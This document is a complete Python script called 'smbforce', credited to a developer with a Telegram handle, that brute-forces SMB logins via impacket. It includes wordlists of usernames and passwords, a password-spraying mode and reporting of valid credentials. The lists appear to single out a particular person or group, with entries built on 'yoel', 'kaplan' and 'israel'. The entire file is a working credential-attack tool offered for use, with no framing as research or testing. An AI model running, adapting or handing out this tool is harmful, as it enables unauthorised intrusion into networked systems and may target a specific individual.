#!/usr/bin/env python3
"""
smbforce — SMB credential brute force
Dev: Dravik  TG: @x_tcp
"""
import argparse
import sys
import time
from itertools import product

try:
    from impacket.smbconnection import SMBConnection, SessionError
except ImportError:
    print("[!] impacket not installed:  pip install impacket")
    sys.exit(1)

USERS = [
    "administrator", "admin", "user", "guest", "root",
    "test", "sa", "oracle", "postgres", "ftp",
    "www", "web", "backup", "support", "info",
    "operator", "manager", "server", "system", "default",
    "localadmin", "sql", "mysql", "mssql", "webadmin",
    "webmaster", "postmaster", "nobody", "anonymous", "temp",
    "IUSR", "IWAM", "NETWORK SERVICE", "LOCAL SERVICE",
    "ASPNET", "IIS_IUSRS", "NETWORKSERVICE",
    "yoel", "yoelkaplan", "kaplan", "israel", "israeli",
    "david", "moshe", "avraham", "yosef", "shlomo",
    "daniel", "yossi", "avi", "noam", "gil",
    "user1", "user2", "user01", "admin1", "admin2",
    "test1", "test2", "guest1", "office", "home",
    "pc", "computer", "workstation", "laptop", "server1",
]

PASSWORDS = [
    "", " ", "0", "1", "12", "123", "1234", "12345", "123456",
    "1234567", "12345678", "123456789", "1234567890",
    "000", "0000", "00000", "000000", "111111", "11111111",
    "password", "password1", "Password1", "Password123", "P@ssw0rd",
    "P@ssword", "passw0rd", "pass", "passwd", "pwd", "secret",
    "letmein", "welcome", "welcome1", "Welcome1", "Welcome123",
    "qwerty", "qwerty123", "qwertyuiop", "asdfgh", "zxcvbn",
    "1q2w3e", "1q2w3e4r", "1qaz2wsx", "qazwsx", "qwe123",
    "admin", "admin1", "admin123", "Admin123", "Admin@123",
    "administrator", "administrator1", "Administrator123",
    "root", "root1", "root123", "Root123", "toor",
    "sa", "sa123", "master", "system", "default",
    "abc123", "abcd1234", "a123456", "changeme", "change_me",
    "test", "test123", "Test123", "testing", "tester",
    "guest", "guest123", "user", "user123", "User123",
    "login", "login123", "access", "access123", "temp123",
    "1234qwer", "qwer1234", "1234abcd", "abcd1234",
    "1q2w3e4r5t", "111222", "121212", "123123", "112233",
    "michael", "jordan", "superman", "batman", "starwars",
    "monkey", "dragon", "sunshine", "princess", "football",
    "iloveyou", "trustno1", "whatever", "shadow", "ninja",
    "shalom", "shalom123", "israel", "israel123", "israel2024",
    "israel2025", "israel2026", "yoel", "yoel123", "yoel2026",
    "kaplan", "kaplan123", "kaplan2026", "telaviv", "jerusalem",
    "company", "company123", "corp", "corp123", "office",
    "office123", "work", "work123", "business", "employee",
    "2020", "2021", "2022", "2023", "2024", "2025", "2026",
    "Summer2024", "Summer2025", "Winter2024", "Winter2025",
    "nevermind", "whatever1", "nothing", "secure", "secure123",
]

BANNER = """
  smbforce — SMB brute force
  Dev: Dravik  TG: @x_tcp
"""


def try_login(ip, port, user, password, domain="", timeout=5):
    try:
        conn = SMBConnection(ip, ip, sess_port=port, timeout=timeout)
        conn.login(user, password, domain)
        conn.close()
        return "ok"
    except SessionError as e:
        msg = str(e)
        if "STATUS_ACCOUNT_LOCKED_OUT" in msg:
            return "locked"
        if "STATUS_LOGON_FAILURE" in msg or "STATUS_WRONG_PASSWORD" in msg:
            return "fail"
        return "error"
    except Exception:
        return "error"


def main():
    p = argparse.ArgumentParser(prog="smbforce", description="SMB credential brute force")
    p.add_argument("-ip", required=True)
    p.add_argument("-P", "--port", type=int, default=445)
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--delay", type=float, default=0.3)
    p.add_argument("--max", type=int, default=5000)
    p.add_argument("--spray", action="store_true")
    p.add_argument("--user", default="")
    p.add_argument("--password", default=None)
    args = p.parse_args()

    users = [args.user] if args.user else USERS
    passwords = [args.password] if args.password is not None else PASSWORDS

    print(BANNER)
    print(f"[*] target: {args.ip}:{args.port}")
    print(f"[*] users: {len(users)}  passwords: {len(passwords)}  total: {len(users) * len(passwords)}")
    print(f"[*] mode: {'spray' if args.spray else 'cartesian'}  delay: {args.delay}s  max: {args.max}\n")

    if args.spray:
        pairs = [(u, pw) for pw in passwords for u in users]
    else:
        pairs = list(product(users, passwords))

    hits, attempts, start = [], 0, time.time()

    for user, password in pairs:
        if attempts >= args.max:
            print(f"\n[!] reached --max {args.max}")
            break
        attempts += 1
        result = try_login(args.ip, args.port, user, password, args.domain)

        if result == "ok":
            label = password if password else "<blank>"
            print(f"[+] SUCCESS  {user}:{label}")
            hits.append({"user": user, "pass": password})
        elif result == "locked":
            print(f"\n[!] ACCOUNT LOCKED: {user} — stopping")
            break
        elif result == "error":
            print(f"[?] error on {user} — skipping")
        else:
            if attempts % 50 == 0:
                elapsed = time.time() - start
                rate = attempts / elapsed if elapsed > 0 else 0
                print(f"[.] {attempts}/{len(pairs)}  ({rate:.1f}/s)")
        time.sleep(args.delay)

    print()
    if hits:
        print(f"[+] {len(hits)} valid credential(s):")
        for h in hits:
            print(f"    {h['user']}:{h['pass'] if h['pass'] else '<blank>'}")
    else:
        print("[-] no valid credentials found")


if __name__ == "__main__":
    main()
